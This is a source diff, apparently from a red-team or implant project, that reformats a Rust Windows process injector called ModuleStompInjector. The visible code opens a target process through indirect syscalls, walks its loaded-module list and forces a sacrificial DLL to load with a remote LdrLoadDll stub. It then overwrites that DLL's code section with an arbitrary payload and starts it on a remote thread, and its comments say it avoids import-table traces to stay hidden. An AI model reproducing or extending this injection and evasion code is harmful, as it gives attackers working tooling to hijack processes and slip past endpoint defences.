@@ -28,8 +28,10 @@ macro_rules! nt_read_proc {
         let mut _br: usize = 0;
         let _s = crate::syscall!(
             "NtReadVirtualMemory",
-            $hproc as u64, $base as u64,
-            $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
+            $hproc as u64,
+            $base as u64,
+            $buf as *mut _ as u64,
+            std::mem::size_of_val($buf) as u64,
             &mut _br as *mut _ as u64,
         );
         (_s.unwrap_or(-1), _br)
@@ -38,8 +40,10 @@ macro_rules! nt_read_proc {
         let mut _br: usize = 0;
         let _s = crate::syscall!(
             "NtReadVirtualMemory",
-            $hproc as u64, $base as u64,
-            $buf as *mut _ as u64, $len as u64,
+            $hproc as u64,
+            $base as u64,
+            $buf as *mut _ as u64,
+            $len as u64,
             &mut _br as *mut _ as u64,
         );
         (_s.unwrap_or(-1), _br)
@@ -63,7 +67,10 @@ unsafe fn collect_peb_candidates(
     let mut ldr_ptr = 0usize;
     let (s, _) = nt_read_proc!(h_proc, (peb_addr + 0x18) as u64, &mut ldr_ptr);
     if s < 0 || ldr_ptr == 0 {
-        return Err(anyhow!("Failed to read target Ldr pointer (status={:#x})", s));
+        return Err(anyhow!(
+            "Failed to read target Ldr pointer (status={:#x})",
+            s
+        ));
     }
 
     let list_head = ldr_ptr + 0x10; // InLoadOrderModuleList
@@ -86,12 +93,20 @@ unsafe fn collect_peb_candidates(
 
         if dll_base != 0 && name_len > 0 && name_buf != 0 {
             let mut name_wide = vec![0u16; name_len / 2];
-            nt_read_proc!(h_proc, name_buf as u64, name_wide.as_mut_ptr() as *mut u8, name_len);
+            nt_read_proc!(
+                h_proc,
+                name_buf as u64,
+                name_wide.as_mut_ptr() as *mut u8,
+                name_len
+            );
             let name_str = String::from_utf16_lossy(&name_wide);
             let lname = name_str.to_ascii_lowercase();
 
             // Extract just the filename component (strip path)
-            let base_name = lname.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(&lname);
+            let base_name = lname
+                .rsplit(|c| c == '\\' || c == '/')
+                .next()
+                .unwrap_or(&lname);
 
             if !common::config::is_dll_excluded(base_name, exclusions, builtin_exclusions) {
                 // Read PE headers from target process to check .text section
@@ -153,8 +168,10 @@ macro_rules! nt_write_proc {
         let mut _bw: usize = 0;
         let _s = crate::syscall!(
             "NtWriteVirtualMemory",
-            $hproc as u64, $base as u64,
-            $buf as *const _ as u64, $len as u64,
+            $hproc as u64,
+            $base as u64,
+            $buf as *const _ as u64,
+            $len as u64,
             &mut _bw as *mut _ as u64,
         );
         (_s.unwrap_or(-1), _bw)
@@ -169,8 +186,10 @@ macro_rules! nt_alloc_proc {
         let mut _sz: usize = $size;
         let _s = crate::syscall!(
             "NtAllocateVirtualMemory",
-            $hproc as u64, &mut _base as *mut _ as u64,
-            0u64, &mut _sz as *mut _ as u64,
+            $hproc as u64,
+            &mut _base as *mut _ as u64,
+            0u64,
+            &mut _sz as *mut _ as u64,
             (winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE) as u64,
             $prot as u64,
         );
@@ -190,9 +209,12 @@ macro_rules! nt_free_proc {
         let mut _fs: usize = 0;
         crate::syscall!(
             "NtFreeVirtualMemory",
-            $hproc as u64, &mut _fb as *mut _ as u64,
-            &mut _fs as *mut _ as u64, 0x8000u64,
-        ).ok();
+            $hproc as u64,
+            &mut _fb as *mut _ as u64,
+            &mut _fs as *mut _ as u64,
+            0x8000u64,
+        )
+        .ok();
     }};
 }
 
@@ -205,9 +227,11 @@ macro_rules! nt_protect_proc {
         let mut _old: u32 = 0;
         let _s = crate::syscall!(
             "NtProtectVirtualMemory",
-            $hproc as u64, &mut _pb as *mut _ as u64,
+            $hproc as u64,
+            &mut _pb as *mut _ as u64,
             &mut _ps as *mut _ as u64,
-            $new_prot as u64, &mut _old as *mut _ as u64,
+            $new_prot as u64,
+            &mut _old as *mut _ as u64,
         );
         _s.unwrap_or(-1)
     }};
@@ -218,12 +242,8 @@ macro_rules! nt_protect_proc {
 #[cfg(windows)]
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::winnt::{
-            IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
-        };
-        use winapi::um::winnt::{
-            PAGE_EXECUTE_READ, PAGE_READWRITE,
-        };
+        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+        use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READWRITE};
         use winapi::um::winnt::{
             PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
             PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE, THREAD_TERMINATE,
@@ -297,13 +317,20 @@ impl Injector for ModuleStompInjector {
             );
             match open_status {
                 Ok(s) if s >= 0 && h_proc_val != 0 => {}
-                Ok(s) => return Err(anyhow!("ModuleStomp: NtOpenProcess returned status {:#x}", s)),
+                Ok(s) => {
+                    return Err(anyhow!(
+                        "ModuleStomp: NtOpenProcess returned status {:#x}",
+                        s
+                    ))
+                }
                 Err(e) => return Err(anyhow!("ModuleStomp: NtOpenProcess syscall failed: {}", e)),
             }
             let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
 
             macro_rules! close_h {
-                () => { crate::syscall!("NtClose", h_proc as u64).ok(); };
+                () => {
+                    crate::syscall!("NtClose", h_proc as u64).ok();
+                };
             }
             macro_rules! cleanup_and_err {
                 ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
@@ -357,7 +384,8 @@ impl Injector for ModuleStompInjector {
                 payload.len(),
                 operator_exclusions,
                 builtin_exclusions,
-            ).map_err(|e| {
+            )
+            .map_err(|e| {
                 close_h!();
                 e
             })?;
@@ -390,10 +418,8 @@ impl Injector for ModuleStompInjector {
                 let mut loaded_ok = false;
 
                 for candidate in sacrificial_candidates.iter() {
-                    let wide: Vec<u16> = candidate
-                        .encode_utf16()
-                        .chain(std::iter::once(0))
-                        .collect();
+                    let wide: Vec<u16> =
+                        candidate.encode_utf16().chain(std::iter::once(0)).collect();
                     let wide_bytes = wide.len() * 2;
                     let us_offset = wide_bytes;
                     let base_addr_offset = us_offset + 16;
@@ -401,11 +427,15 @@ impl Injector for ModuleStompInjector {
 
                     let remote_buf = nt_alloc_proc!(h_proc, total_remote, PAGE_READWRITE);
                     if remote_buf.is_null() {
-                        log::warn!("module_stomp: failed to allocate remote buffer for {}", candidate);
+                        log::warn!(
+                            "module_stomp: failed to allocate remote buffer for {}",
+                            candidate
+                        );
                         continue;
                     }
 
-                    let (s, _) = nt_write_proc!(h_proc, remote_buf, wide.as_ptr() as *const u16, wide_bytes);
+                    let (s, _) =
+                        nt_write_proc!(h_proc, remote_buf, wide.as_ptr() as *const u16, wide_bytes);
                     if s < 0 {
                         log::warn!("module_stomp: failed to write DLL name for {}", candidate);
                         nt_free_proc!(h_proc, remote_buf);
@@ -416,14 +446,15 @@ impl Injector for ModuleStompInjector {
                         (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
                     let remote_str_va = remote_buf as usize;
                     let mut us_bytes = [0u8; 16];
-                    us_bytes[0..2]
-                        .copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
+                    us_bytes[0..2].copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
                     us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());
-                    us_bytes[8..16]
-                        .copy_from_slice(&(remote_str_va as u64).to_le_bytes());
+                    us_bytes[8..16].copy_from_slice(&(remote_str_va as u64).to_le_bytes());
                     let (s, _) = nt_write_proc!(h_proc, remote_us_ptr, us_bytes.as_ptr(), 16);
                     if s < 0 {
-                        log::warn!("module_stomp: failed to write UNICODE_STRING for {}", candidate);
+                        log::warn!(
+                            "module_stomp: failed to write UNICODE_STRING for {}",
+                            candidate
+                        );
                         nt_free_proc!(h_proc, remote_buf);
                         continue;
                     }
@@ -431,7 +462,10 @@ impl Injector for ModuleStompInjector {
                     // Build x64 stub for LdrLoadDll
                     let stub_region = nt_alloc_proc!(h_proc, 256, PAGE_READWRITE);
                     if stub_region.is_null() {
-                        log::warn!("module_stomp: failed to allocate stub region for {}", candidate);
+                        log::warn!(
+                            "module_stomp: failed to allocate stub region for {}",
+                            candidate
+                        );
                         nt_free_proc!(h_proc, remote_buf);
                         continue;
                     }
@@ -457,17 +491,22 @@ impl Injector for ModuleStompInjector {
 
                     let (s, _) = nt_write_proc!(h_proc, stub_region, stub.as_ptr(), stub.len());
                     if s < 0 {
-                        log::warn!("module_stomp: failed to write LdrLoadDll stub for {}", candidate);
+                        log::warn!(
+                            "module_stomp: failed to write LdrLoadDll stub for {}",
+                            candidate
+                        );
                         nt_free_proc!(h_proc, stub_region);
                         nt_free_proc!(h_proc, remote_buf);
                         continue;
                     }
 
-                    let prot_status = nt_protect_proc!(h_proc, stub_region, stub.len(), PAGE_EXECUTE_READ);
+                    let prot_status =
+                        nt_protect_proc!(h_proc, stub_region, stub.len(), PAGE_EXECUTE_READ);
                     if prot_status < 0 {
                         log::warn!(
                             "module_stomp: NtProtectVirtualMemory on stub failed {:#x} for {}",
-                            prot_status, candidate
+                            prot_status,
+                            candidate
                         );
                         nt_free_proc!(h_proc, stub_region);
                         nt_free_proc!(h_proc, remote_buf);
@@ -498,32 +537,27 @@ impl Injector for ModuleStompInjector {
                         Ok(s) if s >= 0 && !h_thread.is_null() => {
                             const LDRLOADDLL_TIMEOUT_MS: u32 = 30_000;
                             // NtWaitForSingleObject (indirect syscall, no IAT entry).
-                            let timeout_100ns: i64 =
-                                -((LDRLOADDLL_TIMEOUT_MS as i64) * 10_000);
-                            let timeout_bytes =
-                                i64::to_ne_bytes(timeout_100ns);
+                            let timeout_100ns: i64 = -((LDRLOADDLL_TIMEOUT_MS as i64) * 10_000);
+                            let timeout_bytes = i64::to_ne_bytes(timeout_100ns);
                             let wait_status = crate::syscall!(
                                 "NtWaitForSingleObject",
-                                h_thread as u64,      // Handle
-                                0u64,                  // Alertable = FALSE
+                                h_thread as u64,               // Handle
+                                0u64,                          // Alertable = FALSE
                                 timeout_bytes.as_ptr() as u64, // Timeout
                             );
-                             let wait_nt = wait_status.unwrap_or(-1i32);
-                             const STATUS_TIMEOUT: i32 = 0x00000102;
+                            let wait_nt = wait_status.unwrap_or(-1i32);
+                            const STATUS_TIMEOUT: i32 = 0x00000102;
                             if wait_nt == STATUS_TIMEOUT {
                                 log::warn!(
                                     "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                     LDRLOADDLL_TIMEOUT_MS, candidate
                                 );
-                                crate::syscall!(
-                                    "NtTerminateThread",
-                                    h_thread as u64,
-                                    1u64
-                                ).ok();
+                                crate::syscall!("NtTerminateThread", h_thread as u64, 1u64).ok();
                             } else if wait_nt != 0 {
                                 log::warn!(
                                     "module_stomp: NtWaitForSingleObject returned {:#x} for {}",
-                                    wait_nt as u32, candidate
+                                    wait_nt as u32,
+                                    candidate
                                 );
                             }
                             crate::syscall!("NtClose", h_thread as u64).ok();
@@ -537,7 +571,8 @@ impl Injector for ModuleStompInjector {
                         Err(e) => {
                             log::warn!(
                                 "module_stomp: NtCreateThreadEx syscall failed: {} for {}",
-                                e, candidate
+                                e,
+                                candidate
                             );
                         }
                     }
@@ -551,14 +586,18 @@ impl Injector for ModuleStompInjector {
                         payload.len(),
                         operator_exclusions,
                         builtin_exclusions,
-                    ).unwrap_or_default();
+                    )
+                    .unwrap_or_default();
 
                     // Find the one matching our candidate name
                     for c in new_candidates {
                         let lcand = candidate.to_ascii_lowercase();
                         let ldll = c.name.to_ascii_lowercase();
                         // The loaded module name may include a full path; compare just the filename
-                        let dll_file = ldll.rsplit(|ch| ch == '\\' || ch == '/').next().unwrap_or(&ldll);
+                        let dll_file = ldll
+                            .rsplit(|ch| ch == '\\' || ch == '/')
+                            .next()
+                            .unwrap_or(&ldll);
                         if dll_file.trim_end_matches('\0').eq_ignore_ascii_case(&lcand) {
                             let in_preferred_band = (c.text_size as usize) >= PREFERRED_TEXT_MIN
                                 && (c.text_size as usize) <= PREFERRED_TEXT_MAX;
@@ -641,7 +680,8 @@ impl Injector for ModuleStompInjector {
             if payload.len() > text_size as usize {
                 cleanup_and_err!(
                     "Payload ({} bytes) larger than target .text section ({} bytes)",
-                    payload.len(), text_size
+                    payload.len(),
+                    text_size
                 );
             }
 
@@ -666,7 +706,9 @@ impl Injector for ModuleStompInjector {
                 nt_protect_proc!(h_proc, target_addr, text_size as usize, PAGE_EXECUTE_READ);
                 cleanup_and_err!(
                     "NtWriteVirtualMemory failed: status {:#x}, wrote {} of {} bytes",
-                    write_status, bytes_written, payload.len()
+                    write_status,
+                    bytes_written,
+                    payload.len()
                 );
             }
 
@@ -681,8 +723,11 @@ impl Injector for ModuleStompInjector {
             // Flush I-cache (defense-in-depth on ARM64, no-op on x86_64).
             crate::syscall!(
                 "NtFlushInstructionCache",
-                h_proc as u64, target_addr as u64, payload.len() as u64,
-            ).ok();
+                h_proc as u64,
+                target_addr as u64,
+                payload.len() as u64,
+            )
+            .ok();
 
             // ── Execute via NtCreateThreadEx (indirect syscall) ─────────────
             // The syscall! macro resolves NtCreateThreadEx's SSN
@@ -710,16 +755,10 @@ impl Injector for ModuleStompInjector {
                     crate::syscall!("NtClose", h_exec_thread as u64).ok();
                 }
                 Ok(s) => {
-                    cleanup_and_err!(
-                        "NtCreateThreadEx execution failed with status {:#x}",
-                        s
-                    );
+                    cleanup_and_err!("NtCreateThreadEx execution failed with status {:#x}", s);
                 }
                 Err(e) => {
-                    cleanup_and_err!(
-                        "NtCreateThreadEx indirect syscall failed: {}",
-                        e
-                    );
+                    cleanup_and_err!("NtCreateThreadEx indirect syscall failed: {}", e);
                 }
             }
 
